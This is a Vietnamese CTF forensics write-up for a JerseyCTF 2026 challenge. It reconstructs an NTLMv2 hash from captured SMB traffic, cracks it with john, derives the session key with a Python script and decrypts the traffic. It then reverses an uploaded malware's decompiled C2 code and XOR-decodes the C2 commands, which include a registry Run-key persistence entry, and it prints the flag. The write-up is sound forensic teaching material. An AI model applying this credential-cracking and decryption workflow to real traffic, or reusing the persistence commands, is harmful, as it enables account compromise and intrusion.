# File-Transfer

<img width="612" height="745" alt="Screenshot 2026-04-19 012534" src="https://github.com/user-attachments/assets/3c784742-0c7e-4ceb-96f7-db1d360524c8" />

**Link challenge: https://github.com/sajjadium/ctf-archives/blob/main/ctfs/JerseyCTF/2026/forensic/file_transfer/export.pcap.xz**

**Description: Our network security solution has alerted us to some suspicious traffic from a user's workstation. Can you help us figure out what is going on?
This is the 3rd time this month something happened with this user, we really need to improve our password policies...**

Flow của bài này ban đầu khá dễ đánh lừa, khi mà lúc bật file pcap lên và xem xét các statistic như `protocol hierachy` và `conversation` chúng ta sẽ thấy được các hầu như lượng lớn traffic và total size của toàn bộ packet đều nằm ở giao thức SMB/SMB2 làm cho chúng ta đi vào sâu vào hướng SMB/SMB2, nhưng mà.

Bước phân tích và trích xuất được data từ luồng **SMB/SMB2** chỉ là bước phụ để dẫn mình tới 1 stream tcp khác trong file pcap chứa payload chính. Bây giờ mình bắt đầu phân tích từng bước để solve challenge này

Đầu tiên mình sẽ phân tích từ `statistic protocol hierachy` để xem toàn bộ giao thức, total size bên trong mỗi giao thức để bắt đầu phân tích:

<img width="1525" height="847" alt="image" src="https://github.com/user-attachments/assets/243352d8-877b-48e4-ac4a-1f1885cdd09a" />

Ở đây chúng ta sẽ thấy được hầu hết lượng traffic sẽ nằm bên trong giao thức `SMB2` và `percent bytes` cũng nằm hầu hết ở giao thức `smb2`, nên đây sẽ là nơi để mình bắt đầu phân tích hợp lí nhất. Và toàn bộ traffic smb2 đều tập trung ở `ip.src == 10.1.2.210 && tcp.port == 64628` và `ip.dst == 10.1.2.200 && tcp.port == 445`. Bây giờ trước khi di vào cách giao thức `smb2` tạo 1 phiên kết nối để cho client có thể sử dụng các services của server thì mình cần đi vào cấu trúc của protocol này, ròi mới đi tiếp vào cách protocol này tạo phiên, và thực hiện các bước decrypt traffic phía sau.

> Ở trước mỗi **SMB2** messages có 4 bytes transport header. 1 byte đầu luôn là `0x00`, 3 byte sau là độ dài của phần **SMB2** messages theo network byte order.
> 
> Bên trong transport header, mọi message SMB2 đều bắt đầu bằng SMB2 header cố định 64 bytes; sau đó mới tới phần body thay đổi theo từng lệnh (`NEGOTIATE`, `SESSION_SETUP`, `TREE_CONNECT`, `CREATE`, `READ`, `WRITE`,..)
>
> Các fields quan trọng bên trong SMB2 header:
> - ProtocolId: magic của SMB2, thường là FE 'S' 'M' 'B'.
> - StructureSize: luôn là 64 cho SMB2 header.
> - Command: mã lệnh hiện tại, ví dụ NEGOTIATE, SESSION_SETUP, TREE_CONNECT, CREATE, READ, WRITE.
> - Status: có ý nghĩa rõ ở response; ví dụ STATUS_SUCCESS, STATUS_MORE_PROCESSING_REQUIRED.
> - CreditCharge / Credits: cơ chế flow control của SMB2.
> - Flags: ví dụ packet có được ký (SIGNED) hay không, có phải async hay DFS op không.
> - NextCommand: dùng cho compound request, tức nhiều lệnh SMB2 ghép trong một message.
> - MessageId: số định danh request/response trên cùng connection.
> - TreeId: định danh share hiện tại.
> - SessionId: định danh phiên SMB đã authenticate.
> - Signature: chữ ký dùng cho message signing.
>
Trình tự các bước handshake để tạo 1 phiên **SMB2** 

- Bước 0: Thực hiện kết nối tcp handshake `SYN -> SYN/ACK -> ACK` qua port 445 của SMB để hoàn tất quá trình kết nối tầng vận, để tạo phiên conversation giữa client và server.

- Bước 1: NEGOTIATE REQUEST (thảo luận về các cách kết nối)
  Client gửi `SMB command: NEGOTIATE protocol`
  - Request Dialects
  - NTLM 0.12
  - `SMB 2.???` - tức là client có `SMB2/SMB3` server cần chọn version protocol phù hợp để tiếp tục phiên

- Bước 2: NEGOTIATE Response
  Server trả lời:
  - **Security mode: 0x03**: `Signing enabled và Signing Required` nghĩa là server bắt buộc signing.
  - **Dialect: 0x02FF**: ý nghĩa là server muốn nói, họ có hỗ trợ version SMB2.1 hoặc version cao hơn. Giá trị `0x02FF` chỉ xuất hiện trong response cho kiểu multi-protocol negotiate có chuỗi `SMB2.???` 
  - **Server GUID**: GUID mà server sinh ra để xác thực.
  - **Max Read/Write**: Total bytes tối đa mà các request `read/write` được server chấp nhận.
  - **Blob Offset và Blob Length**: cho biêt security blob bắt đầu ở đâu và dài bao nhiêu tính từ đầu SMB2 header.
 
- Bước 3: Security Blob/SPNEGO: `OID: 1.3.6.1.5.5.2` là **SPNEGO**. Trong **SPNGO** chỉ có 2 kiểu mesages lõi là `negTokenInit` và `negTokenResp`:
  - `netTokeninit`: là mesages mở đầu để nêu ra các cơ chế auth được hỗ trợ, còn các round exchange sau đó sẽ sử dụng `negTokenResp`. Bên trong wireshark thì packet này sẽ chứa các authentication mà client gửi cho server sẽ được dùng cho bước `SESSION_SETUP`.
 
- Bước 4: SMB Session setup Request #1: Đây là các bước để bắt đầu tạo phiên:
  - Client gửi:
    - `Command: Session_SETUP`
    - `Security Buffer`
    - `SecurityMode`
    - `Capabilities`
    - `SecurityBufferOffset`
    - `SecurityBufferLength`
    - `PreviousSessionId`
  - Ở đây, `SecurityBufferOffset/Length` chỉ vị trí token `GSS/NTLM/Kerberos` thật sự. `PreviosSessid` thường là 0 neeusd đây là authentication mới, chỉ có ý nghĩa khi reauth/reconnect một session cũ. `SecurityMode` ở request client muốn signing để toàn vẹn ở mức nào

- Bước 5: SMB2 Session Setup Request #2
    - `Status` trong SMB2 header
    - `SessionFlags`
    - `SecurityBufferOffet`
    - `SecurityBufferLength`
    - `Buffer`
  - Nếu `Status = STATUS_MORE_PROCESSING_REQUIRED`, tức là quá trình auth của client vẫn chưa hoàn tất, và cần server chả về 1 token để cho client có thể thực hiện tiếp tục identify auth của mình. Và khi auth đã hoàn tất chúng ta sẽ thấy fields `Status = STATUS_SUCCESS`. 

- Bước 6,7: SMB2 Session Setup #2
  **Session Setup Request**
  - **Session SETUP request Header**:
    -  `Session ID: 0x000034004800004d`: Đây chỉ là session id cũ được server cấp trong lần trước đó thực hiện ở vòng cũ. Trong session setup mới này sẽ sử dụng một `sessionID` mới để thực hiện tạo thành key decrypt traffic.
    - `Command: Session_SETUP (1)`: cho biết quá trình này vẫn đang xác thực SMB, chưa vào kết nối đến các tree.
  - **Session SETUP Request BODY**:
    - `Blob Length: 601`: Độ dài của token xác thực, vì đây là `NTLMSSP_AUTH`, nên blob khá dài do chứa cả response, user/domain/host, session key,..
      - `responseToken` bên trong chính là **NTLMSSP_AUTH** chứa các fields quan trọng cho quá trình decrypt traffic
  - **Bên trong NTLMSSP_AUTH**
    - `NTLM Message Type: NTLMSSP_AUTH (0x00000003)`: đây là message type = 3 của NTLM chứa các fields như _NEGOTIATE, CHALLENGE, AUTH_.
    - **NTLM Response**
      - `Length: 392`: bên trong chứa các response của **NTLMv2**: `NTProofstr`, timestamp, `client challeneg`,..
      - `NTProofstr`: Đây là phần proof cốt lõi. Server dùng password/hash đúng của tài khoản ở phía server/DC, Server Challenge, blob client gửi. **NTProofStr là bằng chứng xác thực, không phải password**
      - `NTLMv2 Client Challenge`: một nonce ngẫu nhiên do client tạo, làm cho response auth mỗi lần sẽ khác nhau, và tránh việc cùng password mà response lại lặp nhau.
      - `Domain name: IT640`
      - `Username: operator1`
      - `Session Key`: Đây là key material của NTLM version, dùng để server xác thực thành công, từ giá trị này server và client sẽ có cùng 1 khóa phiên để bảo vệ session phia sau.
  **Session Setup Response**
  - **Session SETUP response Header**
    - `NT Status: STATUS_SUCCESS`: Nó xác nhận client đã verify thành công proof trong `NTLMSSP_AUTH`, session được chấp thuận và chuẩn bị cho quá trình sử dụng các dịch vụ của tree. **SMB session được tạo xong và trở thành session hợp lệ.**
    - `Flags: 0x00000019, Response, Signing, Priority`: Bước này chứng tỏ server đã có đủ key/session để cho bước bảo vệ message/decrypt phần traffic phía sau.
    - `Session ID: 0x000034004800004d`: Chính là session của client khi nãy được server lặp lại trong phiên kết nối thoi, và cho phép client có thể dùng `sessionid` này cho việc kết nối tới các cây.
  - **Session Setup Response body**
    - `accept-completed`: quá trình SPNGO hoàn tất, auth hoàn tất và khong còn challeneg nào giữa client và server nữa.
    - `NTLMSSP Verifier` fields mang tính integrity. 

- Bước cuối cùng là sử dụng session id và session key sau khi verify xong thực hiện kết nối đến các tree `$IPC` và cây `$Public`. 

Đây là phần structure của 1 giao thức `smb`, bây giờ mình sẽ đi sâu vào flow của bài này và hướng để solve:
`Phân tích phiên session setup req và resp của client và server -> Tạo 1 hash NTLMv2 của client để thực hiện crack password của client -> có password client thì mới gent ra được sessionn key -> decrypt smb2 traffic -> lấy được file upload/download -> thực hiện analyze file đó mới có hướng đi tiếp theo`

Khi mình phân tích vào session setup request của phiên kết nối này, mình sẽ thấy được client thực hiện gửi cho server các thông tin quan trọng như `domain/username/NTproofstr/client challenge` trong packet `Session Setup NTLMSSP_AUTH của user: IT640/operator1` và trong packet `response NTLMSSP_CHALLENGE` của server sẽ có `server challenge`, bây giờ mình sẽ ghép thành 1 hash NTLMv2 để crack password của user này:

`hash format NTLMv2: Username::Domain:ServerChallenge:NTProofStr:ClientChallenge`
-> Username: operator1
-> Domain: IT640
-> Server Challenge lấy từ packet Session Setup response NTLMSSP_CHALLENGE: `ntlmssp.ntlmserverchallenge`: **a83c46425815db34**
-> NTProofstr: mình sẽ lấy trong packet Session Setup request NTLMSSP_AUTH - user operator1: `ntlmssp.ntlmv2_response.ntproofstr`, ngoài ra chúng ta có thể dựa vào 32 bytes đầu tiên của `NTLMv2 response` để có thể xác định được NTProofstr.
-> Client Challenge: Phần còn lại của fields `NTLMv2 response` khi bỏ 32 bytes đầu của `NTproofstr` ra chính là client challenge.

Giờ thực hiện ghép nó lại thành hash NTLMv2 sau đó dùng `john` để crack:

```
hash NTLMv2
operator1::IT640:a83c46425815db34:e705d3efd451d9eff0b3005233f7b573:01010000000000001366cc6ceecddc012eec3d0097740ebd0000000002000a0049005400360034003000010012005700530032003000320035002d00530031000400260063006f00720070002e00690074003600340030002e0069006e007400650072006e0061006c0003003a005700530032003000320035002d00530031002e0063006f00720070002e00690074003600340030002e0069006e007400650072006e0061006c000500260063006f00720070002e00690074003600340030002e0069006e007400650072006e0061006c00070008001366cc6ceecddc0106000400020000000800500050000000000000000000000000200000324ad49cd8c06cd57b3e895fd7e1f8b498a54f8a43816223dfab71e7013c6ce0efb9d8a1f651758f475c106843bb63d6622ba533b447ac1d4cb80299edea1f940a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0031002e0032002e003200300030000000000000000000

┌──(nhduydeptrai㉿tobi)-[/mnt/…/kali_linux_real_machine/CTF/jersey_CTF/file-transfer]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Sau khi có password `password:operator1`, bây giờ mình sẽ thực hiện viết script để decrypt session key của client và server

```python
import hashlib
import hmac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms

password = "password"
username = "operator1"
domain = "IT640"
ntproofstr = bytes.fromhex("e705d3efd451d9eff0b3005233f7b573")

encrypted_session_key = bytes.fromhex("56b3b5c22fb3e4f59e96af905a592a55") 

nt_hash = hashlib.new('md4', password.encode('utf-16le')).digest()

ntlmv2_hash = hmac.new(nt_hash, (username + domain).encode('utf-16le'), hashlib.md5).digest()

session_base_key = hmac.new(ntlmv2_hash, ntproofstr, hashlib.md5).digest()

algorithm = algorithms.ARC4(session_base_key)

cipher = Cipher(algorithm, mode=None)
decryptor = cipher.decryptor()
random_session_key = decryptor.update(encrypted_session_key)

print(f"Decrypted Session Key: {random_session_key.hex()}")
```

Sau khi run script thì mình sẽ có được session key dùng để decrypt ra traffic `smb2`

```bash
──(nhduydeptrai㉿tobi)-[/mnt/…/kali_linux_real_machine/CTF/jersey_CTF/file-transfer]
└─$ python3 gen_sessionkey.py 
/mnt/hgfs/kali_linux_real_machine/CTF/jersey_CTF/file-transfer/gen_sessionkey.py:18: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  algorithm = algorithms.ARC4(session_base_key)
Decrypted Session Key: 56b3b5c22fb3e4f59e96af905a592a55
```

Bây giờ mình sẽ dùng session id và session key để thực hiện decrypt traffic smb2 thoi:

<img width="936" height="430" alt="image" src="https://github.com/user-attachments/assets/1a1e10b7-6b38-4827-8e11-ab7d39cd8c0e" />

`session id: thì mình kh hiểu sao mình rev nó ngược lại thì mới được, và điền thêm session key ở trên đã decrypt, 2 ô còn lại thì để trống`

<img width="1868" height="566" alt="image" src="https://github.com/user-attachments/assets/a5940c23-b0f4-427e-88af-ef84f442cbab" />

Tới đây mình sẽ thấy client đang thực hiện upload 1 file `.exe` lên qua lệnh `Write Request` và Server cũng đã thực hiện `Write Response` và vế sau thì con malware executable này đã được up lên server thành công.

Nếu ở đây mình nghĩ chỉ cần export nó ra ròi strings hay cat sẽ có flag, nhưng mà chưa tay`.

Tới đây mình thực hiện reverse c malware này, bởi vì bên trong malware mình có biết được nó có 1 số chuỗi như:
```
10.1.2.211
getaddrinfo failed with error: %d
socket failed with error: %ld
Unable to connect to server!
CMD-SEQ-A
CMD-SEQ-B
CMD-SEQ-C
CMD-SEQ-D
shutdown failed with error: %d
Bytes received: %d
Connection closed
recv failed with error: %d
sorry_im_not_the_flag_:)
```
Nên khi bắt đầu reverse bên trong malware mình chọn vào options hiện ra các strings bên trong source code của nó: `views -> Open Subviews -> Strings`

<img width="695" height="599" alt="image" src="https://github.com/user-attachments/assets/a2820968-10d1-4e37-86cd-8ba7c25a2ecf" />

Khi đó mình thấy có chuỗi `sorry_im_not_the_flag_:)` -> Nó chính là key của bài này được dùng để thực hiện phép xor, sau 1 lúc thực hiện tìm kiếm hàm gọi đến source của chức năng `xor`, thì mình kiếm được:

```
int __cdecl sub_4010F0(int a1, unsigned int a2)
{
  int v3; // [esp+8h] [ebp-Ch]
  unsigned int i; // [esp+Ch] [ebp-8h]

  v3 = sub_405740(512);
  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + v3) = aSorryImNotTheF[(int)i % 24] ^ *(_BYTE *)(i + a1);
  *(_BYTE *)(a2 + v3) = 0;
  return v3;
}
```
Chức năng của hàm này dùng để xor với payload được nhận về từ C2 server, và được kết nối bằng 1 hàm khác bên trong ida

<summary> source Connect C2 server
  <details>
    int sub_401300()
{
  int Error; // eax
  int v2; // eax
  int v3; // eax
  ADDRINFOA pHints; // [esp+0h] [ebp-3C8h] BYREF
  int len; // [esp+20h] [ebp-3A8h]
  PADDRINFOA ppResult; // [esp+24h] [ebp-3A4h] BYREF
  PADDRINFOA i; // [esp+28h] [ebp-3A0h]
  int v8; // [esp+2Ch] [ebp-39Ch]
  SOCKET s; // [esp+30h] [ebp-398h]
  WSAData WSAData; // [esp+34h] [ebp-394h] BYREF
  __m128i buf[32]; // [esp+1C4h] [ebp-204h] BYREF

  s = -1;
  sub_403590(buf, 0, 0x200u);
  len = 512;
  ppResult = 0;
  i = 0;
  v8 = WSAStartup(0x202u, &WSAData);
  if ( v8 )
  {
    sub_401740("WSAStartup failed with error: %d\n", v8);
    return 1;
  }
  else
  {
    sub_403590((__m128i *)&pHints, 0, 0x20u);
    pHints.ai_family = 0;
    pHints.ai_socktype = 1;
    pHints.ai_protocol = 6;
    v8 = getaddrinfo("10.1.2.211", "55544", &pHints, &ppResult);
    if ( v8 )
    {
      sub_401740("getaddrinfo failed with error: %d\n", v8);
      WSACleanup();
      return 1;
    }
    else
    {
      for ( i = ppResult; i; i = i->ai_next )
      {
        s = socket(i->ai_family, i->ai_socktype, i->ai_protocol);
        if ( s == -1 )
        {
          Error = WSAGetLastError();
          sub_401740("socket failed with error: %ld\n", Error);
          WSACleanup();
          return 1;
        }
        v8 = connect(s, i->ai_addr, i->ai_addrlen);
        if ( v8 != -1 )
          break;
        closesocket(s);
        s = -1;
      }
      freeaddrinfo(ppResult);
      if ( s == -1 )
      {
        sub_401740("Unable to connect to server!\n");
        WSACleanup();
        return 1;
      }
      else if ( sub_401000(s, ::buf) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else if ( sub_401000(s, aCmdSeqB) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else if ( sub_401000(s, aCmdSeqC) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else if ( sub_401000(s, aCmdSeqD) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else
      {
        v8 = shutdown(s, 1);
        if ( v8 == -1 )
        {
          v2 = WSAGetLastError();
          sub_401740("shutdown failed with error: %d\n", v2);
          closesocket(s);
          WSACleanup();
          return 1;
        }
        else
        {
          do
          {
            v8 = recv(s, buf[0].m128i_i8, len, 0);
            if ( v8 <= 0 )
            {
              if ( v8 )
              {
                v3 = WSAGetLastError();
                sub_401740("recv failed with error: %d\n", v3);
              }
              else
              {
                sub_401740("Connection closed\n");
              }
            }
            else
            {
              sub_401740("Bytes received: %d\n", v8);
            }
          }
          while ( v8 > 0 );
          closesocket(s);
          WSACleanup();
          return 0;
        }
      }
    }
  }
}
  </details>
</summary>

Ở đây hàm `sub_401300()` chính là hàm thực hiện kết nối C2:
- `WSAStartup`
- `getaddrinfo("10.1.2.211", "55544", &pHints, &ppResult);` -> kết nối đến ip `10.1.2.211:55544`
- Sau đó Lần lượt gửi các lệnh:
  - `CMD-SEQ-A` 
  - `CMD-SEQ-B`
  - `CMD-SEQ-C`
  - `CMD-SEQ-D`
  - Và với mỗi lần malware thực hiện gửi 1 lệnh đến server C2, thì nó sẽ trả về một cục payload từ các lệnh `CMD-SEQ-*`.
  - `sub_401180(s)` hàm này dùng để nhận dữ liệu về, xử lý payload và xor với key.
 
```
connect_to_c2();
send("CMD-SEQ-A");
recv_payload();
xor_decode_with("sorry_im_not_the_flag_)");

send("CMD-SEQ-B");
recv_payload();
xor_decode_with("sorry_im_not_the_flag_)");

sub_401300()
{
    connect(C2);

    send("CMD-SEQ-A");
    sub_401180(sock);   // nhận blob A

    send("CMD-SEQ-B");
    sub_401180(sock);   // nhận blob B

    send("CMD-SEQ-C");
    sub_401180(sock);   // nhận blob C

    send("CMD-SEQ-D");
    sub_401180(sock);   // nhận blob D
}
...
```
Hàm thực hiện xor với payload mà server gửi về cho malware. Như trong script trên mình sẽ thấy mỗi khi nhận được payload xong nó thực hiện payload đó với nhau thành 1 payload hoàn chỉnh, ròi đem di xor.


Bây giờ mình đã hiểu được flow cuối cùng trong challenge để đi tới bước cuối: 
> Ở đây mình vẫn khá thắc mắc tại sao stream thực hiện connect đến server C2 lại diễn ra trước khi stream upload malware lên server diễn ra, nên là hơi sú ở đây nhưng mà mình nghĩ là do lỗi server thoi.

Còn các flow cuối là mình thực hiện trích xuất payload bên trong server c2 gửi về cho malware. Điểm lưu ý ở đây khi chúng ta chú ý vào phần raw bytes của payload, mình sẽ thấy được mỗi payload đều được `split()` bởi 3 bytes `/x04/x04/x04/` để ngăn cách payload, nên khi chúng ta thực hiện decrypt thì mình cần `split()` 3 bytes này ra để tránh bị lỗi, cùng với 1 byte `/x00` ở đầu:

 Dùng wireshark, thực hiện navigate từ server -> client, ròi sau đó lưu raw bytes đó vào 1 file.

Sau đó dùng script dưới đây để thực hiện xor:
```python
def xor_repeat(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
key = b"sorry_im_not_the_flag_:)"
raw = open("payload_stream_tcp.bin", "rb").read()
parts = raw.split(b"\x04\x04\x04")

for i, part in enumerate(parts, 1):
    if not part:
        continue
    if i == 1 and part[:1] == b"\x00":
        part = part[1:]
    plain = xor_repeat(part, key)
    print(f"---part {i} ---")
    try:
        print(plain.decode())
    except UnicodeDecodeError:
        print(plain)
```

```
--- part 1 ---
start "" "C:\Program Files\DaVinci\latmove.bat"
--- part 2 ---
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "DaVinci" /t REG_SZ /F /D "C:\Program Files\DaVinci\DaVinci.exe"
--- part 3 ---
echo Mess with the best, die like the rest >> C:\Users\Public\Desktop\pwnd.txt & echo jctf{Dah914znHQigIolS-j7xvL5XiYooM4Uce} >> C:\Users\Public\Desktop\pwnd.txt
```

Giải thích qua 1 tí thì:

> Command 2: `reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "DaVinci" /t REG_SZ /F /D "C:\Program Files\DaVinci\DaVinci.exe"` thực hiện tạo 1 giá trị registry value tự động chạy file `Davinci.exe` bên trong registry key `Run` - tức là mỗi khi user đăng nhập vào hệ thống thì nó sẽ tự động chạy malware.
> 
> Command 3: `echo Mess with the best, die like the rest >> C:\Users\Public\Desktop\pwnd.txt & echo jctf{Dah914znHQigIolS-j7xvL5XiYooM4Uce} >> C:\Users\Public\Desktop\pwnd.txt` dùng echo thực hiện ghi nó vào strings vào file `pwnd.txt` trong đó có flag.


**flag: jctf{Dah914znHQigIolS-j7xvL5XiYooM4Uce}**
